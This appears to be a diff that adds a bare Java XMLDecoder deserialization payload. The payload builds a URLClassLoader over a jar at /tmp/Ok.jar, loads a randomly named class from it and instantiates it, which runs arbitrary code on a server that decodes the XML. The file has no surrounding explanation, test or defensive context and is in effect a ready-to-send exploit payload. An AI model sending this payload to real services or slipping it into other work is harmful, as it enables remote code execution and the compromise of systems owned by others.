@@ -1,0 +1,11 @@
+<java>
+    <new class="java.net.URLClassLoader">
+        <array class="java.net.URL" length="1">
+            <void index="0"><object class="java.net.URL"><string>file:///tmp/Ok.jar</string></object></void>
+        </array>
+        <void method="loadClass">
+            <string>J14575392249482</string>
+            <void method="newInstance"/>
+        </void>
+    </new>
+</java>
